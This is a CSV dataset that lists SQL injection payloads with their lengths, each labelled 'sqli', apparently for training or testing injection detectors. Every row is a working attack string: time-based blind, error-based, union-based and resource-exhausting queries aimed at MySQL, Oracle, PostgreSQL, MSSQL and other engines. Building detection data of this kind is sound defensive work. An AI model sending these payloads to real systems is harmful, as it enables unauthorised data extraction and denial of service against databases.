payload,length,attack_type
"1'+(select 'wkcq' where 1020=1020 and 2388=benchmark(5000000,md5(0x6d457153))#",78,sqli
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('%'='",110,sqli
-7346 or 8571=8571--,20,sqli
"-9630%"" union all select 8592,8592,8592,8592--",46,sqli
"-2007%')) union all select 7298,7298,7298#",42,sqli
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",91,sqli
"1"") order by 1#",15,sqli
"1'||(select 'setd' from dual where 3686=3686 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",235,sqli
"1'+(select 'qrml' where 3791=3791 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",96,sqli
"1'+(select 'cwta' where 6091=6091;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",118,sqli
"1) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",101,sqli
"1""))) and 5429=9596",19,sqli
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('opyt'='opyt",91,sqli
1) where 2468=2468 and (select * from (select(sleep(5)))gcrr)#,62,sqli
1') where 1424=1424 and sleep(5)--,34,sqli
"1'+(select 'wkbg' where 3921=3921 and 8407=(select count(*) from generate_series(1,5000000)))+'",95,sqli
1)));(select * from (select(sleep(5)))srmq) and (((3124=3124,60,sqli
"1"")) as ydkd where 2455=2455 and sleep(5)--",43,sqli
"1)) as jfae where 6684=6684 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,sqli
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",160,sqli
"1') as eany where 3169=3169 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,sqli
"-4993"" union all select 6959,6959,6959--",40,sqli
"1"") as assu where 7521=7521 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",179,sqli
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",97,sqli
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""xccy""=""xccy",113,sqli
"-8966""))) or 1628=2712",22,sqli
"1') as mgko where 1828=1828 and make_set(8403=8403,8899)--",58,sqli
-8828)) as ospo where 2141=2141 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,231,sqli
"-3443"")) union all select 4043,4043,4043,4043,4043,4043,4043#",61,sqli
"1)) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((6829=6829",79,sqli
"1"") as ckoi where 4674=4674 union all select null,null,null,null,null,null,null,null,null,null#",95,sqli
"1"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli
"1'||(select 'zrea' from dual where 1223=1223 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",106,sqli
"1%""))) and 7758=4792 and (((""%""=""",33,sqli
-2783%')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',252,sqli
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,201,sqli
"1'||(select 'bzxa' where 6320=6320;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",124,sqli
"1%""))) union all select null,null,null,null,null,null#",54,sqli
"-3997'+(select 'avjk' where 1917=1917 union all select 1917,1917,1917--",71,sqli
1';(select * from (select(sleep(5)))srmq) and 'yfvu' like 'yfvu,63,sqli
"1' where 5060=5060;select count(*) from generate_series(1,5000000)--",68,sqli
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('ywxe' like 'ywxe",118,sqli
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""dwcy""=""dwcy",212,sqli
"1"") where 8612=8612;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",116,sqli
"1,(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",96,sqli
"1'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",113,sqli
"1%')) union all select null,null,null,null,null,null,null,null,null--",69,sqli
"1' where 9602=9602;select benchmark(5000000,md5(0x4c4d6142))--",62,sqli
"-5174'))) or make_set(9515=7938,7938) and ((('ygee'='ygee",57,sqli
1%')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,104,sqli
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dbxi"" like ""dbxi",168,sqli
1' where 8537=8537 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,252,sqli
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""dksc""=""dksc",206,sqli
1%' rlike sleep(5)#,19,sqli
"-1033 union all select 8731,8731,8731,8731,8731,8731--",54,sqli
"1))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,sqli
"-1277"") where 6622=6622 or 3038=3038",36,sqli
"1')) as xuab where 4369=4369 union all select null,null,null--",62,sqli
"1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))#",79,sqli
"1'+(select dyfw where 7743=7743 and 8407=(select count(*) from generate_series(1,5000000)))+'",93,sqli
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),206,sqli
"1"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""oiuw""=""oiuw",107,sqli
"-7083 union all select 7705,7705,7705,7705,7705#",48,sqli
"-8783')) union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",72,sqli
-8999'))) or 6872=6872 and ((('jare'='jare,42,sqli
1'));select (case when (2774=5503) then 2774 else 2774*(select 2774 from information_schema.character_sets) end)#,113,sqli
-9054))) or 9323=9323#,22,sqli
"1)) as myyh where 5116=5116 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",103,sqli
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('wusq'='wusq",106,sqli
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('ootz' like 'ootz",118,sqli
"1"" and 5205=9975#",17,sqli
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)-- ivku",178,sqli
"1"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""gknn"" like ""gknn",113,sqli
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (9112=9112",77,sqli
-4617'))) or 9323=9323#,23,sqli
"-4148%""))) or (8459=8459)*4906 and (((""%""=""",43,sqli
"1"")) as jmoy where 9676=9676 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",138,sqli
"-9672%""))) order by 1#",22,sqli
"1') as jwvp where 5231=5231 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,sqli
1'+(select 'gprq' where 8928=8928;waitfor delay '0:0:5'--,57,sqli
"-4571' union all select 3227,3227,3227,3227--",45,sqli
"-3169"" order by 1#",18,sqli
"1"") as aifd where 5962=5962;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",121,sqli
"1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('bmzj' like 'bmzj",88,sqli
"1' in boolean mode) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",115,sqli
"1'||(select 'xuou' from dual where 7681=7681 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))||'",137,sqli
1'+(select iwbs where 4939=4939;begin user_lock.sleep(5); end--,63,sqli
-8080')) order by 1#,20,sqli
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('novq'='novq",84,sqli
"1) union all select null,null,null,null#",40,sqli
"1"")) and 8329=5584#",19,sqli
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",94,sqli
"-5245""))) union all select 8106,8106,8106#",42,sqli
"-5606)) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# zcyc",157,sqli
"-1917"") or 8571=8571--",22,sqli
1) where 4992=4992;select case when 7717=7717 then 1 else null end--,68,sqli
"1'||(select 'gmkp' where 6016=6016;select count(*) from generate_series(1,5000000))||'",86,sqli
-8513' union all select 7414--,30,sqli
"-9736' or make_set(7311=2067,2067) and 'czdt' like 'czdt",56,sqli
1) rlike (select * from (select(sleep(5)))sgvo),47,sqli
"-3587') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('psqt' like 'psqt",225,sqli
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('aovy'='aovy",163,sqli
"1')) and elt(4460=2665,2665) and (('qmzu'='qmzu",47,sqli
"-6122"") union all select 6578,6578--",36,sqli
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",59,sqli
"1%"")) union all select null,null,null,null,null,null#",53,sqli
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('iifh'='iifh",112,sqli
"1""))) union all select null,null,null,null,null,null,null,null--",64,sqli
1');select sleep(5) and ('qcsv'='qcsv,37,sqli
1;begin dbms_lock.sleep(5); end--,33,sqli
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('iwkg'='iwkg",191,sqli
1%'))) and 2444=9282#,21,sqli
1') as irnj where 7274=7274 and 6969=(select 6969 from pg_sleep(5))--,69,sqli
-4669) or 2452=1601#,20,sqli
"1"") or 8156=(select count(*) from generate_series(1,5000000))--",63,sqli
-1602' or 3038=3038,19,sqli
-9841 where 4612=4612 union all select 4612--,45,sqli
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",101,sqli
"1')) as lizu where 7691=7691 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",166,sqli
1' in boolean mode) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)#,207,sqli
-9358' or 9887=2569--,21,sqli
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",46,sqli
"-5989%"" union all select 3581,3581,3581,3581,3581--",51,sqli
"1"")));select pg_sleep(5)--",26,sqli
"1%"")) union all select null--",29,sqli
-2456'))) or (8459=8459)*4906 and ((('bbkp'='bbkp,49,sqli
"-4155'))) union all select 1775,1775,1775,1775,1775,1775,1775--",63,sqli
"1"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""oxxi""=""oxxi",117,sqli
"1"" where 5328=5328 and 2388=benchmark(5000000,md5(0x6d457153))#",63,sqli
1')));select case when 7717=7717 then 1 else null end--,55,sqli
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (5220=5220",219,sqli
"1'||(select 'osux' from dual where 7066=7066 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",141,sqli
"1));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",94,sqli
-2912')) order by 1--,21,sqli
"1"")) as ycvh where 4523=4523 and sleep(5)#",42,sqli
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'kird'='kird",111,sqli
"1'||(select 'bpml' where 7360=7360 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))||'",127,sqli
-1876%') union all select 6463--,32,sqli
"1%"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""%""=""",123,sqli
"1%')) union all select null,null,null,null,null,null#",53,sqli
"-6587') union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",76,sqli
"-2605%'))) union all select 4738,4738#",38,sqli
1) and (select * from (select(sleep(5)))gcrr)#,46,sqli
"-9179"") union all select 7144,7144,7144,7144,7144,7144,7144,7144--",66,sqli
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",96,sqli
"1'));iif(5571=4947,1,1/0)",25,sqli
"1'+(select 'aliz' where 5050=5050 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",186,sqli
"-5245' or elt(1032=1032,3623) and 'qfvo'='qfvo",46,sqli
"1)) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",94,sqli
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""ewsr"" like ""ewsr",87,sqli
-2960' or 2163=3143--,21,sqli
1') where 3767=3767 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,115,sqli
"1"")) as hiuf where 3277=3277 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",211,sqli
1' rlike sleep(5)#,18,sqli
"1 and elt(3172=7243,7243)",25,sqli
"-1150') as hdby where 4032=4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",100,sqli
1');waitfor delay '0:0:5' and ('yauq'='yauq,43,sqli
"1"" rlike (select (case when (2724=4757) then 1 else 0x28 end)) and ""cmsa""=""cmsa",79,sqli
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",95,sqli
(select (case when (1421=1421) then 1 else 1421*(select 1421 from master..sysdatabases) end)),93,sqli
"-5205')) union all select 8592,8592,8592,8592,8592,8592--",57,sqli
"1)) as nnpe where 9720=9720 union all select null,null,null,null,null,null,null,null,null#",90,sqli
-8553'+(select adko where 1750=1750 union all select 1750#,58,sqli
"1'||(select 'ymwf' where 1229=1229 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",142,sqli
"1%"")));select (case when (2140=5325) then 2140 else 2140*(select 2140 from information_schema.character_sets) end)#",115,sqli
"1') as ibqr where 5372=5372 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",103,sqli
"1""))) or 8156=(select count(*) from generate_series(1,5000000))--",65,sqli
"-6846%"")) or (8459=8459)*4906 and ((""%""=""",41,sqli
"1'||(select 'ypil' from dual where 4568=4568 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",153,sqli
"-3361 where 1335=1335 or elt(5891=5092,5092)--",46,sqli
"1' in boolean mode) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)#",190,sqli
1)) as hxtp where 5478=5478 and 8594=(select 8594 from pg_sleep(5))--,69,sqli
1)) rlike sleep(5)#,19,sqli
"-2929""))) union all select 8999,8999#",37,sqli
1')) as grne where 9003=9003 order by 1--,41,sqli
"1'+(select jrmz where 4762=4762 and elt(9588=9794,9794))+'",58,sqli
1');select sleep(5),19,sqli
"1)) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((4348=4348",109,sqli
"-4711' in boolean mode) union all select 8007,8007,8007,8007,8007,8007--",72,sqli
1') as nftr where 8825=8825 or (select * from (select(sleep(5)))sddo)#,70,sqli
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('isyg'='isyg",86,sqli
1')) rlike sleep(5) and (('qitl' like 'qitl,43,sqli
"1"")) or 6793=(select 6793 from pg_sleep(5)) and ((""ejpw""=""ejpw",62,sqli
"1'+(select eztr where 4260=4260 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))+'",109,sqli
1';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,96,sqli
1%')));select case when 7717=7717 then 1 else null end--,56,sqli
1';select case when 6555=7349 then 1 else null end--,52,sqli
-2505' or 9323=9323#,20,sqli
"1"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""llgb"" like ""llgb",184,sqli
